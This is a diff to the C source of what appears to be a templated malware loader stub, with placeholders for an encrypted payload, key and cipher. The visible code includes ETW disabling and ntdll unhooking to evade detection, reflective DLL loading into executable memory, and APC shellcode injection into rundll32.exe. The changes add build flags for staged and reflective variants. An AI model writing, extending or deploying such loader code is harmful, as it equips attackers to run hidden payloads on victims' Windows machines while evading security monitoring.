@@ -2,10 +2,10 @@
 #include <tlhelp32.h>
 #include <bcrypt.h>
 #include <string.h>
+#ifdef NEED_REFLECTIVE
 #include "ReflectiveLoader.h"
+#endif
 #include <stdio.h>
-
-#define EARLY_BIRD_MODE 1  // Set to 0 for classic APC, 1 for Early Bird
 
 #ifdef DEBUG
   // variadic macro that works even if you pass only fmt
@@ -40,8 +40,10 @@ typedef FARPROC(WINAPI* tGetProcA)(HMODULE, LPCSTR);
 tLoadLibA pLoadLibA;
 tGetProcA pGetProcA;
 
+#ifndef STAGED_BUILD
 unsigned char payload[] = { {{PAYLOAD_ARRAY}} };
 size_t payload_len = {{PAYLOAD_SIZE}};
+#endif
 unsigned char *payload_ptr = NULL;
 char key[] = {{KEY}};
 char enc_algo[] = {{ENC_ALGO}};
@@ -221,6 +223,7 @@ void PatchETWUnhookNtdll() {
     DisableETW();
 }
 
+#ifdef NEED_REFLECTIVE
 void execute_reflective_dll(unsigned char *dll_buf, size_t dll_len) {
     LPVOID dll_mem = VirtualAlloc(NULL, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!dll_mem) return;
@@ -230,6 +233,7 @@ void execute_reflective_dll(unsigned char *dll_buf, size_t dll_len) {
     DLLMAIN entry = (DLLMAIN)((ULONG_PTR)dll_mem + offset);
     entry((HINSTANCE)dll_mem, DLL_PROCESS_ATTACH, NULL);
 }
+#endif
 
 void inject_APC(unsigned char *sc, size_t l) {
     char str_target[] = "C:\\Windows\\System32\\rundll32.exe";
@@ -287,9 +291,13 @@ int main() {
     DBG("[*] stub: decrypt complete\n");
 
     if (strcmp(payload_type, "dll") == 0) {
+        #ifdef NEED_REFLECTIVE
         DBG("[*] stub: executing reflective DLL\n");
         execute_reflective_dll(buf, len);
         DBG("[*] stub: execute_reflective_dll returned\n");
+        #else
+        DBG("[!] stub: dll payload but NEED_REFLECTIVE undefined! Skipping.\n");
+        #endif
     }
     else if (strcmp(payload_type, "shellcode") == 0) {
         DBG("[*] stub: injecting shellcode via APC\n");
